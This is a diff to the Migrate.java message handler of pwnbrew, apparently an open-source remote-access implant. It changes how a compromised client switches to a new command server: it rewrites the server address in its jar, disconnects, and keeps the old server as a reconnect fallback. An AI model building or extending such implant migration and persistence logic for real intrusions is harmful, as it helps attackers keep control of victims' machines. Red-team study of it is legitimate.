@@ -36,13 +36,6 @@ The copyright on this package is held by Securifera, Inc
 
 */
 
-
-/*
-* Migrate.java
-*
-* Created on June 7, 2013, 11:01:01 PM
-*/
-
 package pwnbrew.network.control.messages;
 
 
@@ -53,12 +46,10 @@ import pwnbrew.ClientConfig;
 import pwnbrew.manager.CommManager;
 import pwnbrew.network.ControlOption;
 import pwnbrew.log.RemoteLog;
-import pwnbrew.misc.Base64Converter;
-import pwnbrew.misc.Constants;
-import pwnbrew.misc.DebugPrinter;
-import pwnbrew.misc.LoaderUtilities;
+import pwnbrew.misc.ReconnectTimer;
 import pwnbrew.misc.Utilities;
 import pwnbrew.network.ClientPortRouter;
+import pwnbrew.selector.SocketChannelHandler;
 
 /**
  *
@@ -117,18 +108,17 @@ public class Migrate extends ControlMessage {
         File theClassPath;
         ClassLoader aClassLoader;
         String properties;
-        String connectStr;
         String propLabel;
         
         //Try and connect to the new server
-        String[] connectArr = getConnectString().split(":");
+        String connectStr = getConnectString().trim();
+        String[] connectArr = connectStr.split(":");
         
         //Get the IP and ports
         if(connectArr.length != 2){
             return;
         }
         
-        String theServerIp = connectArr[0].trim();        
         try {
             
             //Get the port router
@@ -140,60 +130,69 @@ public class Migrate extends ControlMessage {
                 
                 try {
                     
-                    Class stagerClass = Class.forName("stager.Stager");
-                    theClassPath = Utilities.getClassPath();
-                    aClassLoader = stagerClass.getClassLoader();            
-
-                    //Get append spaces to avoid == at the end
-                    StringBuilder aSB = new StringBuilder()
-                        .append("https://")
-                        .append( getConnectString().trim() )
-                        .append("/");
-                    int neededChars = aSB.length() % 3;
-                    for( int i = 0; i < neededChars + 1; i++){
-                        aSB.append(" ");
-                    }
-
-                    //Decode the base64   
-                    DebugPrinter.printMessage(NAME_Class, "Migrating to " + aSB.toString());
-                    connectStr = Base64Converter.encode( aSB.toString().getBytes() );
-                    properties = Constants.PROP_FILE;
-                    propLabel = Constants.URL_LABEL;    
+                    ClientConfig theConf = ClientConfig.getConfig();
                     
-                    //Close the loader
-                    Utilities.restart( passedManager, false, 5000 ); 
+                    //Get the current server ip and port
+                    String serverIp = theConf.getServerIp();
+                    int serverPort = theConf.getSocketPort();
+                    
+                    Utilities.updateServerInfoInJar(connectStr);
+//                    Class stagerClass = Class.forName("stager.Stager");
+//                    theClassPath = Utilities.getClassPath();
+//                    aClassLoader = stagerClass.getClassLoader();            
+//
+//                    //Get append spaces to avoid == at the end
+//                    StringBuilder aSB = new StringBuilder()
+//                        .append("https://")
+//                        .append( connectStr )
+//                        .append("/");
+//                    int neededChars = aSB.length() % 3;
+//                    for( int i = 0; i < neededChars + 1; i++){
+//                        aSB.append(" ");
+//                    }
+//
+//                    //Decode the base64   
+//                    DebugPrinter.printMessage(NAME_Class, "Migrating to " + aSB.toString());
+//                    connectStr = Base64Converter.encode( aSB.toString().getBytes() );
+//                    properties = Constants.PROP_FILE;
+//                    propLabel = Constants.URL_LABEL;  
+//                    
+//                    //Unload the stager
+//                    LoaderUtilities.unloadLibs( aClassLoader );
+//
+//                    //Replace the file
+//                    Utilities.updateJarProperties( theClassPath, properties, propLabel, connectStr );
+//
+//                    //Load it back                    
+//                    LoaderUtilities.reloadLib(theClassPath); 
+                    
+                    //Set the new ones
+                    theConf.setServerIp(connectArr[0]);
+                    theConf.setSocketPort(connectArr[1]);
+                    theConf.setServerId(-1);
+                    
+                    //Get the handler
+                    SocketChannelHandler aSCH = aCPR.getSocketChannelHandler();
+                    aCPR.setReconnectFlag(false);
 
+                    //Set the wrapping flag
+                    if( aSCH != null )
+                        aSCH.setWrapping(true);
+                    
+                    //Tell it not to reconnect
+                    passedManager.disconnect();
+                    
+                    ReconnectTimer aReconnectTimer = ReconnectTimer.getReconnectTimer();  
+                    aReconnectTimer.setBackupServerIp(serverIp);
+                    aReconnectTimer.setBackupServerPort(serverPort);
+                    aReconnectTimer.start();
+                    
                 } catch (ClassNotFoundException ex ){
                     ex = null;
-                    return;
                 }
 
-            } else {
-
-                theClassPath = Utilities.getClassPath(); 
-                aClassLoader = ClassLoader.getSystemClassLoader();
-                properties = Constants.PROP_FILE;            
-
-                //Set the IP
-                connectStr = theServerIp;
-                propLabel = Constants.SERV_LABEL;
-                
-                //Tell it not to reconnect
-                aCPR.setReconnectFlag(false);
-                passedManager.shutdown(); 
-
             } 
-           
-            if( theClassPath != null && theClassPath.isFile() ){ 
-
-                //Close the loader
-                LoaderUtilities.unloadLibs( aClassLoader );
-
-                //Update the jar
-                Utilities.updateJarProperties( theClassPath, properties, propLabel, connectStr );
-
-            }   
-            
+                       
         } catch (IOException ex) {
             RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);        
         } 
